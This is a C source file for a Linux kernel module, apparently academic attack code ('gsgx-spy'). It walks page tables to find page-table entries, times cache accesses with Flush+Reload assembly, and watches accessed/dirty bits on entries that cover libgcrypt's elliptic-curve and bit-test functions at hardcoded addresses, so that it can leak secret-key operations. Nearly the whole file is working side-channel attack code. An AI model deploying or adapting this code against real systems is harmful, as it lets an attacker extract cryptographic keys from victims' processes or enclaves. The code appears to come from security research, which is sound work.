#include "common.h"
#include "pte_utils.h"
#include <linux/slab.h>

spy_pte_set_t *ad_set = NULL; //XXX

/* ============ HELPER FUNCTIONS ============= */

bool adrs_ok = true;
/*
 * Walk 4-level page table: Page Global Directory - Page Upper Directory -
 * Page Middle Directory - Page Table Entry.
 */
pte_t *get_pte_adrs(uint64_t adrs)
{
    unsigned long val; int rv;

    // XXX Dummy access to ensure page is mapped in (abort page semantics)
    rv = get_user(val, (unsigned long*) adrs);
    pr_info("gsgx-spy: accessing vadrs %px: %#lx (rv=%d)\n",
        (void*) adrs, val, rv);

    // start page walk
    pgd_t * pgd = pgd_offset(current->mm, adrs);
    if (pgd_none(*pgd)) {
        printk("not mapped in pgd\n");
        adrs_ok = false;
        return -1;
    }
    p4d_t * p4d = p4d_offset(pgd, adrs); // for linux later than 4.11
    if (p4d_none(*p4d)) {
        printk("not mapped in p4d\n");
        adrs_ok = false;
        return -1;
    }
    pud_t * pud = pud_offset(p4d, adrs);
    if (pud_none(*pud)) {
        printk("not mapped in pud\n");
        adrs_ok = false;
        return -1;
    }
    pmd_t * pmd = pmd_offset(pud, adrs);
    if (pmd_none(*pmd)) {
        printk("not mapped in pmd\n");
        adrs_ok = false;
        return -1;
    }
    pte_t * pte = pte_offset_map(pmd, adrs); // x86-64 always has all page tables mapped. #define pte_offset_map(dir, address) pte_offset_kernel((dir), (address))
    if (pte_none(*pte)) {
        printk("not mapped in pte\n");
        adrs_ok = false;
        return -1;
    }

    pr_info("gsgx-spy: monitoring PTE for vadrs %px at %px with value %px\n",
        (void*) adrs, (void*) pte, (void*) pte_val(*pte));
        pr_info("gsgx-spy: monitoring PTE for vadrs %px at %px with value %px phy_addr: %px\n",
        adrs, (void*) pte, (void*) pte_val(*pte), pte_val(*pte) & ~PAGE_MASK);

    return pte;
}

void add_to_pte_set(spy_pte_set_t *set, uint64_t adrs)
{
    spy_pte_t *cur, *new;
    uint64_t *pte_pt = (uint64_t*) get_pte_adrs(adrs);
    uint64_t mask = 0xFFFFFFFFFFFFFFC0;
    uint64_t cacheline = (uint64_t) pte_pt & mask;

    if (!set)
        return;

    if (set->restrict_cacheline)
    {
        for (cur = set->head; cur; cur = cur->nxt)
            if (cur->cacheline == cacheline)
            {
                pr_info("gsgx-spy: ^^ ignoring PTE in shared cache line 0x%llx\n",
                    cacheline);
                return;
            }
    }

    new = kmalloc(sizeof(spy_pte_t), GFP_KERNEL);
    RET_WARN_ON(!new || !set,);

    new->pte_pt = pte_pt;
    new->cacheline = cacheline;
    new->nxt = set->head;
    set->head = new;
}

/* ============ CACHE SIDE-CHANNEL FUNCTIONS ============= */

/* 
 * Code adapted from: Yarom, Yuval, and Katrina Falkner. "Flush+ reload: a high
 * resolution, low noise, L3 cache side-channel attack." 23rd USENIX Security
 * Symposium (USENIX Security 14). 2014.
 */
unsigned long gsgx_reload(void* p)
{
    volatile unsigned long time;
    
    asm volatile (
        "mfence\n\t"
        "lfence\n\t"
        "rdtsc\n\t"
        "lfence\n\t"
        "movl %%eax, %%esi\n\t"
        "movl (%1), %%eax\n\t"
        "lfence\n\t"
        "rdtsc\n\t"
        "subl %%esi, %%eax \n\t"
        : "=a" (time)
        : "c" (p)
        : "%rsi", "%rdx");
    
    return time;
}

void gsgx_flush(void* p) {
    asm volatile ("clflush (%0)\n\t"
        :
        : "c" (p)
        : "%rax");
}

// XXX no ASLR --> hardcode addresses (from objdump application binary)
#if CONFIG_SPY_HELLO

#define A_ADR 0x7ffff56b8ef0
#define B_ADR 0x7ffff56c8ef0
#define C_ADR 0x7ffff56d8ef0

#define MONITOR_ADRS    C_ADR
#define BASE_ADRS       C_ADR

void construct_pte_set(spy_pte_set_t *set)
{
    pr_info("gsgx-spy: constructing PTE set for hello world test\n");
    add_to_pte_set(set, A_ADR);
    add_to_pte_set(set, B_ADR);
}

#endif

#if 0
#if CONFIG_SPY_GCRY && (CONFIG_SPY_GCRY_VERSION == 163)
    #define GCRYLIB_ADRS    (0xb417000)
    #define GPG_ERR_ADRS    (0xae4e000)

    #define SET_ADRS        (GCRYLIB_ADRS + 0xa7780) // _gcry_mpi_set
    #define TST_ADRS        (GCRYLIB_ADRS + 0xa0a00) // _gcry_mpi_test_bit
    #define MULP_ADRS       (GCRYLIB_ADRS + 0xa97c0) // _gcry_mpi_ec_mul_point
    #define TDIV_ADRS       (GCRYLIB_ADRS + 0xa1310) // _gcry_mpi_tdiv_qr
    #define ERR_ADRS        (GPG_ERR_ADRS + 0x0b6d0) // gpg_err_set_errno
    #define FREE_ADRS       (GCRYLIB_ADRS + 0x0ce90) // _gcry_free
    #define PFREE_ADRS      (GCRYLIB_ADRS + 0x110a0) // _gcry_private_free

    #define XMALLOC_ADRS    (GCRYLIB_ADRS + 0x0d160) // _gcry_xmalloc
    #define MUL_ADRS        (GCRYLIB_ADRS + 0xa6920) // _gcry_mpih_mul
    #define PMALLOC_ADRS    (GCRYLIB_ADRS + 0x10f80) // _gcry_private_malloc

    #define MONITOR_ADRS    SET_ADRS
    #define BASE_ADRS       GCRYLIB_ADRS

    void construct_pte_set(spy_pte_set_t *set)
    {
        pr_info("gsgx-spy: constructing PTE set for gcry v1.6.3\n");
        add_to_pte_set(set, TST_ADRS);
        add_to_pte_set(set, MULP_ADRS);
        add_to_pte_set(set, TDIV_ADRS);
        add_to_pte_set(set, ERR_ADRS);
        add_to_pte_set(set, FREE_ADRS);
        add_to_pte_set(set, PFREE_ADRS);
        
        add_to_pte_set(set, XMALLOC_ADRS);
        add_to_pte_set(set, MUL_ADRS);
        add_to_pte_set(set, PMALLOC_ADRS);
    }

#elif CONFIG_SPY_GCRY && (CONFIG_SPY_GCRY_VERSION == 175)
    #if CONFIG_FLUSH_FLUSH
        #define GCRYLIB_ADRS    (0xb3ea000)
        #define LIBC_ADRS       (0xb039000)
        #define GPG_ERR_ADRS    (0xae21000)

        #define ERRNOLOC_ADRS   (LIBC_ADRS + 0x20590)    // __errno_location
        #define MULP_ADRS       (GCRYLIB_ADRS + 0xca220) // _gcry_mpi_ec_mul_point
        #define TST_ADRS        (GCRYLIB_ADRS + 0xc10d0) // _gcry_mpi_test_bit
        #define ADD_ADRS        (GCRYLIB_ADRS + 0xc0a10) // _gcry_mpi_add

        #define _GPGRT_ADRS     (GPG_ERR_ADRS + 0x2bb0)  // _gpgrt_lock_lock
        #define GPGRT_ADRS      (GPG_ERR_ADRS + 0xb750)  // gpgrt_lock_lock
        #define INT_FREE_ADRS   (LIBC_ADRS + 0x7b110)    // _int_free
        #define INT_MALLOC_ADRS (LIBC_ADRS + 0x7bfe0)    // _int_malloc
        #define LIBC_FREE_ADRS  (LIBC_ADRS + 0x7e970)    // __libc_free
        #define PLT_ADRS        (GCRYLIB_ADRS + 0xab30)  // __errno_location@plt
        #define DO_MALLOC_ADRS  (GCRYLIB_ADRS + 0xe380)  // do_malloc
        #define GCRY_FREE_ADRS  (GCRYLIB_ADRS + 0xf390)  // _gcry_free
        #define PRIV_FREE_ADRS  (GCRYLIB_ADRS + 0x13590) // _gcry_private_free
        #define SEC_FREE_ADRS   (GCRYLIB_ADRS + 0x14120) // _gcry_secmem_free
        #define MPI_MUL_ADRS    (GCRYLIB_ADRS + 0xc2cb0) //_gcry_mpi_mul
        #define MPI_MOD_ADRS    (GCRYLIB_ADRS + 0xc3080) //_gcry_mpi_mod
        #define MPI_DIV_ADRS    (GCRYLIB_ADRS + 0xc5ec0) //_gcry_mpih_divrem
        #define MPI_DIVMOD_ADRS (GCRYLIB_ADRS + 0xc6330) //_gcry_mpih_divmod_1
        #define MPI_ALLOC_LIMB  (GCRYLIB_ADRS + 0xc75b0) //_gcry_mpi_alloc_limb_space
        #define ADD_POINTS_ED   (GCRYLIB_ADRS + 0xc8760) //add_points_edwards
        #define MPI_ADD_POINTS  (GCRYLIB_ADRS + 0xc9bc0) //_gcry_mpi_ec_add_points
        #define MPI_ADD_N       (GCRYLIB_ADRS + 0xcb100) //_gcry_mpih_add_n

        #define MONITOR_ADRS    ERRNOLOC_ADRS
        #define BASE_ADRS       GCRYLIB_ADRS

        void construct_pte_set(spy_pte_set_t *set)
        {
            pr_info("gsgx-spy: constructing F+F PTE set for gcry v1.7.5\n");
            add_to_pte_set(set, MULP_ADRS);
            add_to_pte_set(set, TST_ADRS);
            //add_to_pte_set(set, ADD_ADRS);

            add_to_pte_set(set, _GPGRT_ADRS);
            add_to_pte_set(set, GPGRT_ADRS);
            add_to_pte_set(set, INT_FREE_ADRS);
            //add_to_pte_set(set, INT_MALLOC_ADRS);
            //add_to_pte_set(set, LIBC_FREE_ADRS);
            add_to_pte_set(set, PLT_ADRS);
            add_to_pte_set(set, DO_MALLOC_ADRS);
            //add_to_pte_set(set, GCRY_FREE_ADRS);
            //add_to_pte_set(set, PRIV_FREE_ADRS);
            //add_to_pte_set(set, SEC_FREE_ADRS);
            //add_to_pte_set(set, MPI_MUL_ADRS);
            //add_to_pte_set(set, MPI_MOD_ADRS);
            //add_to_pte_set(set, MPI_DIV_ADRS);
            //add_to_pte_set(set, MPI_DIVMOD_ADRS);
            //add_to_pte_set(set, MPI_ALLOC_LIMB);
            //add_to_pte_set(set, ADD_POINTS_ED);
            //add_to_pte_set(set, MPI_ADD_POINTS);
            //add_to_pte_set(set, MPI_ADD_N);

            add_to_pte_set(ad_set, MULP_ADRS);
            add_to_pte_set(ad_set, TST_ADRS);
            add_to_pte_set(ad_set, ADD_ADRS);
        }

    #else /* !CONFIG_FLUSH_FLUSH */
        #define GCRYLIB_ADRS    (0xb3ea000)

        #define TST_ADRS        (GCRYLIB_ADRS + 0xc10d0) // _gcry_mpi_test_bit
        #define ADDP_ADRS       (GCRYLIB_ADRS + 0xc9bc0) // _gcry_mpi_ec_add_p
        #define MULP_ADRS       (GCRYLIB_ADRS + 0xca220) // _gcry_mpi_ec_mul_p

        #define FREE_ADRS       (GCRYLIB_ADRS + 0x0f390) // _gcry_free
        #define ADD_ADRS        (GCRYLIB_ADRS + 0xc0a10) // _gcry_mpi_add

        #define MONITOR_ADRS    TST_ADRS
        #define BASE_ADRS       GCRYLIB_ADRS

        void construct_pte_set(spy_pte_set_t *set)
        {
            pr_info("gsgx-spy: constructing A/D PTE set for gcry v1.7.5\n");
            add_to_pte_set(set, ADDP_ADRS);
            add_to_pte_set(set, MULP_ADRS);

            add_to_pte_set(set, FREE_ADRS);
            add_to_pte_set(set, ADD_ADRS);
        }
    #endif /* CONFIG_FLUSH_FLUSH */

#elif CONFIG_SPY_MICRO
    #define MONITOR_ADRS    0x807000    // a
    #define BASE_ADRS       0x403017    // asm_microbenchmark_slide

    void construct_pte_set(spy_pte_set_t *set)
    {
        pr_info("gsgx-spy: constructing PTE set for microbenchmark\n");
    }
#else
    #error select spy version in gsgx_attacker_config.h
#endif

#endif

spy_pte_set_t *create_pte_set(int restrict_cacheline)
{
    spy_pte_set_t *rv = kmalloc(sizeof(spy_pte_set_t), GFP_KERNEL);
    RET_WARN_ON(!rv, NULL);
    pr_warn("Monitor addr: %px\n", (void *)MONITOR_ADRS);
    rv->monitor_pte_pt = (uint64_t*) get_pte_adrs(MONITOR_ADRS); // get the target page table entry
    rv->erip_base = BASE_ADRS; // base addr of the target lib, disable ASLR first!
    rv->head = NULL;
    rv->restrict_cacheline = restrict_cacheline;
    return rv;
}

spy_pte_set_t *build_pte_set(void)
{
    adrs_ok = true;
    spy_pte_set_t * rv = create_pte_set(CONFIG_FLUSH_RELOAD); // Use F+R for those PTEs

    construct_pte_set(rv);
    return rv;
}

uint64_t do_test_pte_set(spy_pte_set_t *set, int fr)
{
    uint64_t rv = 0x0;
    int i = 0;
    unsigned long tsc = 0;
    int accessed = 0;
    spy_pte_t *cur;
    RET_WARN_ON(!set, rv);

    for (i = 0, cur = set->head; cur; i++, cur = cur->nxt)
    {
        if (fr)
        {
            tsc = gsgx_reload(cur->pte_pt); 
            accessed = (tsc < CONFIG_RELOAD_THRESHOLD);
            if (ACCESSED(cur->pte_pt) && !accessed)
            {
                pr_warn("F+R false negative: A=%d; tsc=%lu\n",
                    ACCESSED(cur->pte_pt), tsc);
            }
        }
        else
        {
            accessed = ACCESSED(cur->pte_pt); 
        }
        rv |= accessed << i;
    }

    return rv;
}

void clear_pte_set(spy_pte_set_t *set)
{
    spy_pte_t *cur;
    RET_WARN_ON(!set,);

    for (cur = set->head; cur; cur = cur->nxt)
    {
        CLEAR_AD(cur->pte_pt);
        gsgx_flush(cur->pte_pt);
#if CONFIG_FLUSH_RELOAD
        WARN_ON( ACCESSED(cur->pte_pt) ); // double check
#endif
    }
    CLEAR_AD(set->monitor_pte_pt);
    gsgx_flush(set->monitor_pte_pt);
}

uint64_t test_pte_set(spy_pte_set_t *set)
{
#ifdef CONFIG_FLUSH_RELOAD
    uint64_t rv = do_test_pte_set(set, CONFIG_FLUSH_RELOAD);
#else
    uint64_t rv = do_test_pte_set(set, 0); // A/D bit
    clear_pte_set(set);
#endif
    return rv; 
}

void do_free_pte_set(spy_pte_set_t *set)
{
    spy_pte_t *tmp, *cur;
    if (!set) return;
    
    cur = set->head;    
    while (cur)
    {
        tmp = cur->nxt;
        kfree(cur);
        cur = tmp;
    }
    kfree(set);
}

void free_pte_set(spy_pte_set_t *set)
{
    do_free_pte_set(set);
    do_free_pte_set(ad_set);
    ad_set = NULL;
}
